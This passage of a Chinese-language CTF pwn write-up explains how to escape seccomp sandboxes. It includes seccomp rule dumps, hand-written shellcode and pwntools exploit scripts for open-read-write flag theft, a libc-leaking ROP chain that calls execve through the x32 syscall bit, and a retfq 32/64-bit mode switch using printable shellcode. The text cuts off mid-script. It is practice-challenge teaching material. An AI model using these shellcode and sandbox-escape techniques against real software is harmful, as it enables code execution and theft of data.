    <content><![CDATA[<h2 id="最简单的沙盒-orw"><a href="#最简单的沙盒-orw" class="headerlink" title="最简单的沙盒(orw)"></a>最简单的沙盒(orw)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zyy@zyy-virtual-machine:~/pwn$ seccomp-tools dump ./orw </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#open（系统调用号为5）		#sys_open(file,0,0)</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">push 0x0;        #字符串以\x00结尾</span><br><span class="line">push 0x67616c66; #flag</span><br><span class="line">mov ebx,esp;			#此时esp指向&#x27;flag&#x27;,将&#x27;flag&#x27;赋值给ebx</span><br><span class="line">mov eax,0x5;						</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">#read（系统调用号为3）		#sys_read(3,0x0804A0A0,0x40)</span><br><span class="line">mov ebx,0x3;			#文件描述符fd:是文件描述符0\1\2\3,代表标准的输出输入和出错,其他打开的文件</span><br><span class="line">mov ecx, 0x0804A0A0; #直接写到shellcode下面的地址</span><br><span class="line">mov edx, 0x40;	</span><br><span class="line">mov eax, 0x3;				</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">#write（系统调用号为4）		#sys_write(1,0x0804A0A0,0x40)</span><br><span class="line">mov ebx, 0x1;			#文件描述符fd:是文件描述符0\1\2\3,代表标准的输出输入和出错,其他打开的文件</span><br><span class="line">mov ecx, 0x0804A0A0;</span><br><span class="line">mov edx, 0x40;</span><br><span class="line">mov eax, 0x4;</span><br><span class="line">int 0x80;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">27008</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&#x27;mov eax,0x3;mov ecx, 0x0804A0A0;mov ebx,0x3;mov edx,0x40;int 0x80&#x27;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;shellcode:&#x27;</span>, shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="WP-again"><a href="#WP-again" class="headerlink" title="WP_again"></a>WP_again</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">27008</span>)</span><br><span class="line">save_to = <span class="number">0x804a040</span></span><br><span class="line"></span><br><span class="line">payload = shellcraft.i386.<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line">payload += shellcraft.i386.read(<span class="number">0x3</span>, save_to, <span class="number">0x40</span>)</span><br><span class="line">payload += shellcraft.i386.write(<span class="number">0x1</span>, save_to, <span class="number">0x40</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;shellcode:&#x27;</span>)</span><br><span class="line">sh.sendline(asm(payload))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sh.recv())</span><br></pre></td></tr></table></figure>



<h2 id="调用32位的BPI-64位程序"><a href="#调用32位的BPI-64位程序" class="headerlink" title="调用32位的BPI(64位程序)"></a>调用32位的BPI(64位程序)</h2><h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  sandbox(argc, argv, envp);</span><br><span class="line">  hello();</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zyy@zyy-virtual-machine:~/桌面/sandbox$ checksec shellcode</span><br><span class="line">[*] &#x27;/home/zyy/桌面/sandbox/shellcode&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"></span><br><span class="line">zyy@zyy-virtual-machine:~/桌面/sandbox$ seccomp-tools dump ./shellcode</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<h3 id="32位BPI相关定义"><a href="#32位BPI相关定义" class="headerlink" title="32位BPI相关定义"></a>32位BPI相关定义</h3><p>我们虽然不能使用64位下的<code>execv</code>系统调用，但是我们可以让64位程序使用32位的<code>BPI</code>调用<code>execv</code>，相关宏定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * x32 syscall flag bit.  Some user programs expect syscall NR macros</span></span><br><span class="line"><span class="comment"> * and __X32_SYSCALL_BIT to have type int, even though syscall numbers</span></span><br><span class="line"><span class="comment"> * are, for practical purposes, unsigned long.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Fortunately, expressions like (nr &amp; ~__X32_SYSCALL_BIT) do the right</span></span><br><span class="line"><span class="comment"> * thing regardless.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __X32_SYSCALL_BIT	0x40000000</span></span><br></pre></td></tr></table></figure>

<p>所以我们只要在所需的系统调用号上加上<code>0x40000000</code>，就可以用32位模式调用64位调用号，例如：我们希望使用<code>execv</code>，那我们在对<code>rax</code>赋值的时候就可以把原来的<code>59</code>改成<code>0x4000003b</code>(<code>0x40000000+59</code>)。</p>
<h3 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./shellcode&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="string">&#x27;nop;nop;nop;nop;nop;pop rdi;pop rdi;ret&#x27;</span>		<span class="comment"># len(pop_rdi) = 8</span></span><br><span class="line">system = <span class="string">&#x27;nop;xor esi,esi;xor edx,edx;mov rax,0x4000003b;syscall;nop;nop&#x27;</span>	<span class="comment"># len(system) = 16</span></span><br><span class="line">jump_rsp = <span class="number">0x400685</span>		<span class="comment"># jump rsp;</span></span><br><span class="line">sub_rsp = <span class="string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x40068A</span></span><br><span class="line">ret = <span class="number">0x40044e</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Hello ctfer!\nWelcome to the stackoverflow!!\nCan u pwn me?&quot;</span>)</span><br><span class="line">payload = asm(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(jump_rsp) + asm(sub_rsp)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr:&#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">str_bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Hello ctfer!\nWelcome to the stackoverflow!!\nCan u pwn me?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(system)))</span><br><span class="line">payload = asm(pop_rdi) + p64(str_bin_sh) + asm(system)</span><br><span class="line">payload += p64(jump_rsp) + asm(sub_rsp)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>虽然攻击流程比较简单，但是细节还是挺多的，注意以下几点：</p>
<ol>
<li>在构造汇编代码的时候要注意对齐，大小应该是8的整数倍</li>
<li>由于溢出空间不足，所以我们需要依靠<code>rsp</code>来实现程序流的控制（<strong>初始的时候<code>rsp</code>是指向<code>buf</code>的开始位置的</strong>）</li>
<li>注意<code>rsp</code>的动态变化，这就是为什么一开始要进行两次<code>pop rdi</code>的操作</li>
<li>注意<code>rsp</code>存储的应该是汇编指令的地址，而不是其实际的值</li>
</ol>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在攻击成功之后，我们使用<code>ls</code>命令或者是<code>cat</code>命令时会报错，而使用<code>pwd</code>命令或者是<code>cd</code>命令不会报错，这是因为前者是外部命令，后者是内部命令，而外部命令都会使用<code>execv</code>这个系统调用，大部分外部命令存在于<code>bin</code>目录下，而内部命令是系统编译进入了操作系统，所以可以使用，我们可以使用<code>type -a &lt;命令&gt;</code>来查看是否为外部命令。这道题目沙箱禁用了<code>execv</code>，因此对子进程也有效。相关信息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b&#x27;ls\n&#x27;</span><br><span class="line">[DEBUG] Received 0x1e bytes:</span><br><span class="line">    b&#x27;Bad system call (core dumped)\n&#x27;</span><br><span class="line">Bad system call (core dumped)</span><br><span class="line">$ pwd</span><br><span class="line">[DEBUG] Sent 0x4 bytes:</span><br><span class="line">    b&#x27;pwd\n&#x27;</span><br><span class="line">[DEBUG] Received 0x19 bytes:</span><br><span class="line">    00000000  2f 68 6f 6d  65 2f 7a 79  79 2f e6 a1  8c e9 9d a2  │/hom│e/zy│y/··│····│</span><br><span class="line">    00000010  2f 73 61 6e  64 62 6f 78  0a                        │/san│dbox│·│</span><br><span class="line">    00000019</span><br><span class="line">/home/zyy/桌面/sandbox</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zyy@zyy-virtual-machine:~/桌面/sandbox$ type -a ls</span><br><span class="line">ls 是 `ls --color=auto&#x27; 的别名</span><br><span class="line">ls 是 /bin/ls</span><br><span class="line">zyy@zyy-virtual-machine:~/桌面/sandbox$ type -a pwd</span><br><span class="line">pwd 是 shell 内建</span><br><span class="line">pwd 是 /bin/pwd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zyy@zyy-virtual-machine:~/桌面/sandbox$ strace ls</span><br><span class="line">execve(&quot;/bin/ls&quot;, [&quot;ls&quot;], [/* 49 vars */]) = 0</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>解决方案：我们可以寻找<code>ls</code>命令的源码并将其编译为32位的程序（<code>gcc -m32</code>），将其替代<code>bin</code>下的对应文件，或者直接装个32位的操作系统。</p>
<h2 id="模式转换-利用retfq"><a href="#模式转换-利用retfq" class="headerlink" title="模式转换(利用retfq)"></a>模式转换(利用retfq)</h2><h3 id="题目流程-1"><a href="#题目流程-1" class="headerlink" title="题目流程"></a>题目流程</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">signed</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">signed</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r12d</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// r13d</span></span><br><span class="line">  <span class="type">signed</span> __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 arg3[<span class="number">2</span>]; <span class="comment">// [rsp+80h] [rbp-80h] BYREF</span></span><br><span class="line">  __int16 v13; <span class="comment">// [rsp+90h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [rsp+92h] [rbp-6Eh]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [rsp+93h] [rbp-6Dh]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+94h] [rbp-6Ch]</span></span><br><span class="line">  __int16 v17; <span class="comment">// [rsp+98h] [rbp-68h]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [rsp+9Ah] [rbp-66h]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [rsp+9Bh] [rbp-65h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+9Ch] [rbp-64h]</span></span><br><span class="line">  __int16 v21; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [rsp+A2h] [rbp-5Eh]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [rsp+A3h] [rbp-5Dh]</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [rsp+A4h] [rbp-5Ch]</span></span><br><span class="line">  __int16 v25; <span class="comment">// [rsp+A8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [rsp+AAh] [rbp-56h]</span></span><br><span class="line">  <span class="type">char</span> v27; <span class="comment">// [rsp+ABh] [rbp-55h]</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// [rsp+ACh] [rbp-54h]</span></span><br><span class="line">  __int16 v29; <span class="comment">// [rsp+B0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">char</span> v30; <span class="comment">// [rsp+B2h] [rbp-4Eh]</span></span><br><span class="line">  <span class="type">char</span> v31; <span class="comment">// [rsp+B3h] [rbp-4Dh]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [rsp+B4h] [rbp-4Ch]</span></span><br><span class="line">  __int16 v33; <span class="comment">// [rsp+B8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v34; <span class="comment">// [rsp+BAh] [rbp-46h]</span></span><br><span class="line">  <span class="type">char</span> v35; <span class="comment">// [rsp+BBh] [rbp-45h]</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [rsp+BCh] [rbp-44h]</span></span><br><span class="line">  __int16 v37; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> v38; <span class="comment">// [rsp+C2h] [rbp-3Eh]</span></span><br><span class="line">  <span class="type">char</span> v39; <span class="comment">// [rsp+C3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// [rsp+C4h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v41; <span class="comment">// [rsp+C8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v42; <span class="comment">// [rsp+CAh] [rbp-36h]</span></span><br><span class="line">  <span class="type">char</span> v43; <span class="comment">// [rsp+CBh] [rbp-35h]</span></span><br><span class="line">  <span class="type">int</span> v44; <span class="comment">// [rsp+CCh] [rbp-34h]</span></span><br><span class="line">  __int16 v45; <span class="comment">// [rsp+D0h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> v46; <span class="comment">// [rsp+D2h] [rbp-2Eh]</span></span><br><span class="line">  <span class="type">char</span> v47; <span class="comment">// [rsp+D3h] [rbp-2Dh]</span></span><br><span class="line">  <span class="type">int</span> v48; <span class="comment">// [rsp+D4h] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v13 = <span class="number">32</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">21</span>;</span><br><span class="line">  v18 = <span class="number">6</span>;</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">5</span>;</span><br><span class="line">  v21 = <span class="number">21</span>;</span><br><span class="line">  v22 = <span class="number">5</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">37</span>;</span><br><span class="line">  v25 = <span class="number">21</span>;</span><br><span class="line">  v26 = <span class="number">4</span>;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">1</span>;</span><br><span class="line">  v29 = <span class="number">21</span>;</span><br><span class="line">  v30 = <span class="number">3</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">21</span>;</span><br><span class="line">  v34 = <span class="number">2</span>;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">9</span>;</span><br><span class="line">  v37 = <span class="number">21</span>;</span><br><span class="line">  v38 = <span class="number">1</span>;</span><br><span class="line">  v39 = <span class="number">0</span>;</span><br><span class="line">  v40 = <span class="number">231</span>;</span><br><span class="line">  v41 = <span class="number">6</span>;</span><br><span class="line">  v42 = <span class="number">0</span>;</span><br><span class="line">  v43 = <span class="number">0</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">6</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">0</span>;</span><br><span class="line">  v48 = <span class="number">2147418112</span>;</span><br><span class="line">  LOWORD(arg3[<span class="number">0</span>]) = <span class="number">9</span>;</span><br><span class="line">  arg3[<span class="number">1</span>] = (<span class="type">unsigned</span> __int64)&amp;v13;</span><br><span class="line">  v0 = sys_alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  v1 = sys_write(<span class="number">1u</span>, <span class="string">&quot;---------- Shellcode ----------\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  v2 = sys_prctl(<span class="number">38</span>, <span class="number">1uLL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = sys_prctl(<span class="number">22</span>, <span class="number">2uLL</span>, (<span class="type">unsigned</span> __int64)arg3, v3);</span><br><span class="line">  dest = (<span class="type">char</span> *)sys_mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7uLL</span>, <span class="number">34uLL</span>, <span class="number">0xFFFFFFFF</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">  v6 = sys_write(<span class="number">1u</span>, <span class="string">&quot;Input your shellcode: &quot;</span>, <span class="number">0x16</span>uLL);</span><br><span class="line">  len = sys_read(<span class="number">0</span>, dest, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v8 = len;</span><br><span class="line">  <span class="keyword">if</span> ( dest[(<span class="type">int</span>)len - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dest[(<span class="type">int</span>)len - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v8 = len - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dest[i] &lt;= <span class="number">31</span> || dest[i] == <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = sys_write(<span class="number">1u</span>, <span class="string">&quot;Check!\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">LABEL_10:</span><br><span class="line">  v11 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">---------- Shellcode ----------</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008</span><br><span class="line"> 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008</span><br><span class="line"> 0003: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0008</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<p>可以看到禁用了open这个系统调用，但是给了我们fstat这个系统调用，其调用号是0x5（在64位下是<code>sys_fstat</code>，在32位下是<code>sys_open</code>），所以我们利用shellcode的<code>retfq</code>进行模式转换，<code>retfq</code>就相当于<code>jmp rsp; mov cs, [rsp + 0x8]</code>，cs寄存器中0x23表示32位运行模式，0x33表示64位运行模式，所以我们只需要构造<code>push 0x23, push &lt;ret_addr&gt;, retfq</code>就可以实现模式转换。</p>
<p>要注意我们需要重新mmap一段新的空间给32位的shellcode使用，因为题目mmap出的空间是在栈上，而32位模式是无法解析出地址长度比自身长的64位栈地址的，会发生段错误。这里还对输入的字符做了检查，由于syscall的汇编过不了检查，所以不能用syscall，可以用xor的方式绕过手写，也可以使用alpha生成可见字符的shellcode（尽量不要用mov会生成<code>\x00</code>这样的坏字节，用push和pop来赋值）</p>
<blockquote>
<p>参考文章：</p>
<p><a href="https://n0va-scy.github.io/2022/02/14/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/">shellcode 的艺术 | R4bb1t的ctf博客 (n0va-scy.github.io)</a></p>
<p><a href="https://surager.pub/_posts/2020-07-08-%E4%BB%8ESCTF2020_CoolCode%E4%B8%AD%E5%AD%A6%E4%B9%A0open%E7%A6%81%E7%94%A8%E7%9A%84seccomp%E7%BB%95%E8%BF%87/">从SCTF2020_CoolCode中学习open禁用的seccomp绕过 · Surager</a></p>
</blockquote>
<h3 id="mmap-函数的学习"><a href="#mmap-函数的学习" class="headerlink" title="mmap()函数的学习"></a>mmap()函数的学习</h3><p>函数定义：<code>void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize);</code></p>
<p>参数的解释：</p>
<ul>
<li><code>start</code>：指向内存开始的地址，一般为空由操作系统定义</li>
<li><code>length</code>：映射文件内容的大小</li>
<li><code>port</code>：映射区的保护方式（组合形式，一般题目都为7，即可读可写可执行）：<ul>
<li><code>PROT_EXEC</code>：可执行</li>
<li><code>PROT_READ</code>：可读取</li>
<li><code>PROT_WRITE</code>：可被写入</li>
<li><code>PROT_NONE</code>：不能存取</li>
</ul>
</li>
<li><code>flags</code>：影响映射区域的各种特性：<ul>
<li><code>MAP_FIXED</code>：如果参数<code>start</code>所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标</li>
<li><code>MAP_SHARED</code>：对应射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享</li>
<li><code>MAP_PRIVATE</code>：对应射区域的写入操作会产生一个映射文件的复制，即私人的”写入时复制”对此区域作的任何修改都不会写回原来的文件内容</li>
<li><code>MAP_ANONYMOUS</code>：建立匿名映射，此时会忽略参数<code>fd</code>，不涉及文件，而且映射区域无法和其他进程共享</li>
<li><code>MAP_DENYWRITE</code>：只允许对应射区域的写入操作，其他对文件直接写入的操作将会被拒绝</li>
<li><code>MAP_LOCKED</code>：将映射区域锁定住，这表示该区域不会被置换(swap)</li>
</ul>
</li>
<li><code>fd</code>：文件描述符</li>
<li><code>offset</code>：文件映射的偏移量</li>
</ul>
<p>一般用法：<code>mmap(start, len, 7, 34, 0, 0)</code></p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ol>
<li>构造mmap和read的shellcode，开辟一块内存给32位的shellcode，并对这块区域进行写入</li>
<li>转换32位程序，open一下flag，注意32位寄存器和64寄存器存储的区别</li>
<li>转换64位程序，进行read和write</li>
</ol>
<h3 id="限制字符shellcode的生成"><a href="#限制字符shellcode的生成" class="headerlink" title="限制字符shellcode的生成"></a>限制字符shellcode的生成</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode_mmap_read_call = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*mmap(0x40404040, 0x7e, 7, 34, 0, 0)*/</span></span><br><span class="line"><span class="string">push 0x40404040 /*set rdi*/</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x7e /*set rsi*/</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 7 /*set rdx*/</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor r8, r8 /*set r8*/</span></span><br><span class="line"><span class="string">xor r9, r9 /*set r9*/</span></span><br><span class="line"><span class="string">push 0x22 /*set rcx*/</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">push 9   /*set rax*/</span></span><br><span class="line"><span class="string">pop 